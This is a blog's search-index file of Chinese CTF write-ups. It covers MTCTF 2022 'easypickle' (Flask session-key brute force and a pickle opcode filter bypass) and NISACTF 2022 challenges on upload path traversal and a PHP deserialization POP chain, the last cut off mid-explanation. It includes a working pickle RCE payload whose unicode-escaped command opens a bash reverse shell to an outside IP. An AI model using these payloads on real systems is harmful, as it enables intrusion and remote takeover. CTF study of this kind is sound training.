<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>[MTCTF_2022]easypickle</title>
      <link href="/uncategorized/MTCTF-2022-easypickle/"/>
      <url>/uncategorized/MTCTF-2022-easypickle/</url>
      
        <content type="html"><![CDATA[<h2 id="easypickle"><a href="#easypickle" class="headerlink" title="easypickle"></a>easypickle</h2><p>&#x2F;路由:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;user&#x27;</span>):</span><br><span class="line">        session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;&#x27;</span>.join(random.choices(<span class="string">&quot;admin&quot;</span>, k=<span class="number">5</span>))</span><br><span class="line">        <span class="comment">#长度为5，每个位置在‘admin&#x27;随机找一个</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello &#123;&#125;!&#x27;</span>.<span class="built_in">format</span>(session[<span class="string">&#x27;user&#x27;</span>])</span><br></pre></td></tr></table></figure><p>&#x2F;admin路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&quot;admin&quot;</span>: <span class="comment"># 检测用户是否为admin</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;&lt;script&gt;alert(&#x27;Access Denied&#x27;);window.location.href=&#x27;/&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            a = base64.b64decode(session.get(<span class="string">&#x27;ser_data&#x27;</span>)).replace(<span class="string">b&quot;builtin&quot;</span>, <span class="string">b&quot;BuIltIn&quot;</span>).replace(<span class="string">b&quot;os&quot;</span>, <span class="string">b&quot;Os&quot;</span>).replace(<span class="string">b&quot;bytes&quot;</span>, <span class="string">b&quot;Bytes&quot;</span>)</span><br><span class="line">            <span class="comment"># 对session的ser_data的值先进行base64解码，如果由builtin和os和bytes，替换它们的值</span></span><br><span class="line">            <span class="comment"># 禁止了builtin os bytes</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;i&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;o&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;b&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">                <span class="comment"># 禁止 R i o b</span></span><br><span class="line">                <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;R i o b is forbidden&quot;</span>)</span><br><span class="line">            pickle.loads(base64.b64decode(session.get(<span class="string">&#x27;ser_data&#x27;</span>))) <span class="comment"># 并不是用替换后的进行反序列化，而是反序列化原始数据。</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span> <span class="comment"># 无回显</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error!&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从代码分析：注入点在session里面，所以我们第一步，要能伪造session，先拿key密钥。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">2</span>).<span class="built_in">hex</span>()</span><br></pre></td></tr></table></figure><p>2位，可以考虑一下爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./key.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        data = os.urandom(<span class="number">2</span>).<span class="built_in">hex</span>()</span><br><span class="line">        f.write(<span class="string">f&quot;\&quot;<span class="subst">&#123;data&#125;</span>\&quot;&quot;</span>+<span class="string">&quot;\n&quot;</span>) <span class="comment">#必须要用&quot;&quot;包裹住数据。 </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --unsign --cookie <span class="string">&quot;eyJ1c2VyIjoiaW5hbmEifQ.aGcv6w.ES6J2y5h1GTL9DfjyM-kpgpsoLQ&quot;</span> --wordlist key.txt</span><br></pre></td></tr></table></figure><img src="/uncategorized/MTCTF-2022-easypickle/image-20250704094730777.png" class="" title="image-20250704094730777"><img src="/uncategorized/MTCTF-2022-easypickle/image-20250704094910420.png" class="" title="image-20250704094910420"><p>接下里就是写payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># R i o b </span></span><br><span class="line"><span class="comment"># 前面我们在分析代码的时候说过，最终用的还是原始数据，而非替换后的数据。</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;(cos\n</span></span><br><span class="line"><span class="string">system\n</span></span><br><span class="line"><span class="string">Vcalc\n</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># o指令被禁了</span></span><br><span class="line"><span class="comment"># pickle里面有s指令，看看s指令干啥的</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load_setitem</span>(<span class="params">self</span>):</span><br><span class="line">        stack = <span class="variable language_">self</span>.stack</span><br><span class="line">        value = stack.pop() <span class="comment"># 从栈中弹出一个元素</span></span><br><span class="line">        key = stack.pop() <span class="comment"># 从栈中弹出一个元素</span></span><br><span class="line">        <span class="built_in">dict</span> = stack[-<span class="number">1</span>] <span class="comment"># dict的地址指向stack[-1],改变dict,stack[-1]也会改变</span></span><br><span class="line">        <span class="built_in">dict</span>[key] = value <span class="comment"># 给dict的key键赋值</span></span><br><span class="line"><span class="comment"># 我们将s指令插入到o指令后面。</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">Vcalc</span></span><br><span class="line"><span class="string">os.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;&#125;Vkey</span></span><br><span class="line"><span class="string">(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">Vcalc</span></span><br><span class="line"><span class="string">os.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># replace将os中的o替换为大写O</span></span><br><span class="line"><span class="comment"># 就可以绕过o指令的检测</span></span><br><span class="line"><span class="comment"># &#125;Vkey 这主要是为了不让最后的s指令报错。</span></span><br></pre></td></tr></table></figure><p>在本地试了试，确实可以弹出计算器：</p><img src="/uncategorized/MTCTF-2022-easypickle/image-20250704111850105.png" class="" title="image-20250704111850105"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;&#x27;&#125;Vkey</span></span><br><span class="line"><span class="string">(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">V\u0062\u0061\u0073\u0068\u0020\u002D\u0063\u0020\u0022\u0062\u0061\u0073\u0068\u0020\u002D\u0069\u0020\u003E\u0026\u0020\u002F\u0064\u0065\u0076\u002F\u0074\u0063\u0070\u002F\u0034\u0033\u002E\u0031\u0035\u0034\u002E\u0032\u0035\u0033\u002E\u0031\u0039\u0039\u002F\u0033\u0039\u0036\u0036\u0036\u0020\u0030\u003E\u0026\u0031\u0022</span></span><br><span class="line"><span class="string">os.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">paylaod = base64.b64encode(payload)</span><br><span class="line"><span class="built_in">print</span>(paylaod)</span><br><span class="line"><span class="comment"># 反弹shell</span></span><br><span class="line"><span class="comment"># V 指令可以将unicode编码转换为字符串</span></span><br></pre></td></tr></table></figure><p>进行session伪造：</p><img src="/uncategorized/MTCTF-2022-easypickle/image-20250704112158856.png" class="" title="image-20250704112158856"><p>发包：</p><img src="/uncategorized/MTCTF-2022-easypickle/image-20250704112228473.png" class="" title="image-20250704112228473"><p>读取数据：</p><img src="/uncategorized/MTCTF-2022-easypickle/image-20250704112249719.png" class="" title="image-20250704112249719">]]></content>
      
      
      
        <tags>
            
            <tag> pickle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NISACTF 2022</title>
      <link href="/CTFwp/NISACTF-2022/"/>
      <url>/CTFwp/NISACTF-2022/</url>
      
        <content type="html"><![CDATA[<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><img src="/CTFwp/NISACTF-2022/image-20250622171959520.png" class="" title="image-20250622171959520"><img src="/CTFwp/NISACTF-2022/image-20250622185658.png" class="" title="屏幕截图 2025-06-22 185658"><p><strong>如何在010editor复制16进制，Ctrl+Shift+c就可以复制16进制。</strong></p><p>通过赛博厨子将16进制解码，再进行url编码就可以。</p><img src="/CTFwp/NISACTF-2022/image-20250622191440121.png" class="" title="image-20250622191440121"><img src="/CTFwp/NISACTF-2022/image-20250622191508988.png" class="" title="image-20250622191508988"><img src="/CTFwp/NISACTF-2022/image-20250622191523157.png" class="" title="image-20250622191523157"><p>也可以写到文件里面通过脚本进行url编码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_read</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data1</span> = <span class="title function_ invoke__">file_read</span>(<span class="string">&quot;./1.txt&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">rawurlencode</span>(<span class="variable">$data1</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$data2</span> = <span class="title function_ invoke__">file_read</span>(<span class="string">&quot;./2.txt&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">rawurlencode</span>(<span class="variable">$data2</span>);</span><br><span class="line"><span class="comment"># %E2%80%AE%E2%81%A6%20Flag%21%E2%81%A9%E2%81%A6N1SACTF</span></span><br><span class="line"><span class="comment"># %E2%80%AE%E2%81%A6Ugeiwo%E2%81%A9%E2%81%A6cuishiyuan</span></span><br></pre></td></tr></table></figure><h2 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h2><img src="/CTFwp/NISACTF-2022/image-20250622155012937.png" class="" title="image-20250622155012937"><p>泄露了源码</p><p>先分析&#x2F;路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">    Select image to upload:</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;!-- /source --&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 文件上传到/upload目录。</span></span><br></pre></td></tr></table></figure><p>接着分析&#x2F;upload路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files: </span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> file.filename: <span class="comment"># 文件中不能包含.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad filename!&quot;</span>, <span class="number">403</span></span><br><span class="line">    conn = db() <span class="comment"># 跟进db()方法</span></span><br><span class="line">    cur = conn.cursor() <span class="comment"># 创建游标(用于执行SQL语句)</span></span><br><span class="line">    uid = uuid.uuid4().<span class="built_in">hex</span> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,)) <span class="comment">#execute执行sql语句</span></span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Duplicate file&quot;</span></span><br><span class="line">    conn.commit() <span class="comment">#提交当前改动结果(如果向表格插入语句，必须执行conn.commit语句)</span></span><br><span class="line"></span><br><span class="line">    file.save(<span class="string">&#x27;uploads/&#x27;</span> + file.filename)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/file/&#x27;</span> + uid) <span class="comment">#重定向到/file/uid路由</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    g_db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>) <span class="comment"># 查看是否存在数据库</span></span><br><span class="line">    <span class="keyword">if</span> g_db <span class="keyword">is</span> <span class="literal">None</span>: </span><br><span class="line">        g_db = g._database = sqlite3.connect(<span class="string">&quot;database.db&quot;</span>) <span class="comment">#建立与 SQLite 数据库文件的连接。</span></span><br><span class="line">    <span class="keyword">return</span> g_db <span class="comment"># 返回connection对象，进行后续操作；返回/upload路由。</span></span><br></pre></td></tr></table></figure><p>分析&#x2F;file路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(<span class="string">&quot;select path from files where id=?&quot;</span>, (<span class="built_in">id</span>,))</span><br><span class="line">    res = cur.fetchone() <span class="comment">#获取单行数据</span></span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(res[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(<span class="string">&quot;uploads/&quot;</span>, res[<span class="number">0</span>]), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"><span class="comment"># res[0] 以/开头，uploads/会被省略</span></span><br><span class="line"><span class="comment"># 此题主要考察的是就是上面这个。</span></span><br></pre></td></tr></table></figure><p>如果我们上传了一个文件名为&#x2F;flag，那么打开的时候，是打开的&#x2F;flag，而不是我们上传的&#x2F;uploads&#x2F;flag。</p><img src="/CTFwp/NISACTF-2022/image-20250622162942933.png" class="" title="image-20250622162942933"><p>题目做完了，我们看看其他知识点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.before_first_request </span><span class="comment"># 第一次请求前执行一次，flask2.3被删除，flask2.2弃用</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>():</span><br><span class="line">    os.remove(<span class="string">&quot;database.db&quot;</span>) <span class="comment"># 删除database.db</span></span><br><span class="line">    cur = db().cursor() <span class="comment"># 创建游标(用于执行sql语句)</span></span><br><span class="line">    cur.executescript(SCHEMA) <span class="comment"># 创建表格</span></span><br></pre></td></tr></table></figure><p>做python这种题，就要一步一步审计代码，找漏洞。</p><h2 id="babyserialize"><a href="#babyserialize" class="headerlink" title="babyserialize"></a>babyserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;show_me_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>; <span class="comment">// 1 shell</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fun==<span class="string">&quot;show_me_flag&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">hint</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$from</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun=<span class="variable">$val</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fun;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">checkcheck</span>(<span class="variable">$this</span>-&gt;txw4ever);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>; <span class="comment">//5 Ilovetxw</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext-&gt;<span class="title function_ invoke__">nisa</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>; <span class="comment">//4 four</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>; <span class="comment">// 2 NISA</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;huang-&gt;fun=<span class="variable">$arg</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;su;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>; <span class="comment">//3 Ilovetxw</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>; <span class="comment">//fun = &quot;sixsixsix&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//func checkcheck($data)&#123;</span></span><br><span class="line"><span class="comment">//  if(preg_match(......))&#123;</span></span><br><span class="line"><span class="comment">//      die(something wrong);</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//function hint()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;.......&quot;;</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><p>pop链如何找了，一般我们都先找能利用的漏洞，一般能利用的漏洞就是pop链的尾端，我们是从尾端一步一步给首推了。</p><p>__invoke()方法里面有：eval()方法，我们将__invoke()作为末尾，如何触发__invoke()方法了，<strong>当尝试把对象当做函数调用时，就会触发__invoke()方法。</strong></p><p>在Ilovetxw类的__toString()方法中，调用了$bb()方法，如果$bb被我们赋值为NISA实例化后的对象就会触发NISA类里面的__invoke方法。如何触发__toString()方法了，<strong>当把对象当做字符串使用时就会触发。</strong></p><p>1.在NISA类的__wakeup()方法中，如果我们将fun赋值为Ilovetxw类的实例化对象时，对象和字符串进行弱比较，会进行类型的转换，这个时候将对象转换为字符串，就会触发Ilovetxw类的__toString()方法。</p><p>2.在four类的__set()方法中，将a属性赋值为对象，strtolower只接受string类型，而这里接受了一个object类型的，就会触发Ilovetxw类的__toString()方法。如何触发__set()方法了，<strong>对不存在或者不可访问的变量进行赋值的话，就会自动调用。</strong> 